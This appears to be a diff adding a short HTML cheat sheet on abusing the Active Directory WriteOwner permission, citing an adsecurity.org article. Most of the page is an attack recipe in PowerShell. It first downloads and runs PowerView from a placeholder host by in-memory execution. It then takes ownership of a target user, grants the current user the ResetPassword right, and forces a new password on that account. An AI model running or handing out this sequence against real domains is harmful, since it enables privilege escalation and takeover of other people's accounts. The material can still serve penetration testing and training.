@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>writeowner</title>
+</head><body>https://adsecurity.org/?p=3658<br/>
+<br/>
+<ul><li><b>WriteOwner:</b>: Provides the ability to take ownership of an object. The owner of an object can <a href="https://technet.microsoft.com/en-us/library/dd125370(v=ws.10).aspx">gain full control rights on the object</a>.</li>
+<li><i>The right to assume ownership of the object. The user must be an object trustee. The user cannot transfer the ownership to other users</i>.</li>
+</ul>
+&nbsp;<br/>
+<br/>
+<b>Execute PowerView.ps1</b><br/>
+IEX(New-Object Net.WebClient).downloadString('http://&lt;ip&gt;/PowerView.ps1')<br/>
+<br/>
+Set-DomainObjectOwner -Identity &lt;target username&gt; -OwnerIdentity &lt;current user&gt;<br/>
+<br/>
+Add-DomainObjectAcl -TargetIdentity &lt;target username&gt; -PrincipalIdentity &lt;current user&gt; -Rights ResetPassword -Verbose<br/>
+<br/>
+<br/>
+$pass = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force<br/>
+Set-DomainUserPassword &lt;target user&gt; -AccountPassword $pass -verbose<br/>
+</body></html>
